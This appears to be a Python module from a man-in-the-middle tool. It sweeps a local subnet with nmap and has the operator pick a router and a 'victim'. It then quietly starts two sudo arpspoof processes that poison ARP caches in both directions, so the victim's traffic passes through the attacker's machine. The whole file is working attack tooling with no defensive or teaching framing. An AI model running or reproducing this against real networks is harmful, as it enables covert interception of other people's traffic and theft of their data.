import re
import os
import subprocess
from mid import Utils

class NetworkScan:

    def __init__(self):
        self.ip_info = []
        self.ut = Utils.Utils() 
        self.rooter = []
        self.victim = []

    def launch(self):
        self.scan()
        self.ip_choice()

    def ip_choice(self):
        for i in range (len(self.ip_info)):
            print("     [%s] %s -> %s" % (i+1, self.ip_info[i][0], self.ip_info[i][1]))
        rooter_choice = input('\nChoose the rooter: ')
        victim_choice = input('Choose the victim: ')

        self.rooter = self.ip_info[int(rooter_choice)-1]
        self.victim = self.ip_info[int(victim_choice)-1]


    def scan(self):
        self.ut.clean()
        self.ut.logo()
        print('Network scan in progress, please wait ...')
        nmap_cmd = ['nmap','-sP','192.168.1.0-255']
        nmap_output = subprocess.check_output(nmap_cmd).decode()
        lines = nmap_output.splitlines()
        # Get ip and name
        for seq in lines:
            addr = re.search('\S+[\ ][[(](\d{1,3}[.]){3}\d{1,3}[)]',seq)
            if(addr):
                info = re.split('[() ]',addr.group(0))
                info = list(filter(None, info)) 
                self.ip_info.append(info)

    def arpspoof(self):
        FNULL = open(os.devnull, 'w')
        cmd = 'sudo arpspoof -t '+self.rooter[1]+' '+self.victim[1]
        subprocess.Popen(cmd.split(' '), stdout=FNULL, stderr=subprocess.STDOUT)
        cmd = 'sudo arpspoof -t '+self.victim[1]+' '+self.rooter[1]
        subprocess.Popen(cmd.split(' '), stdout=FNULL, stderr=subprocess.STDOUT)
    
    def getIpInfo(self):
        return self.ip_info

    def getIpRooter(self):
        return self.rooter

    def getIpVictim(self):
        return self.victim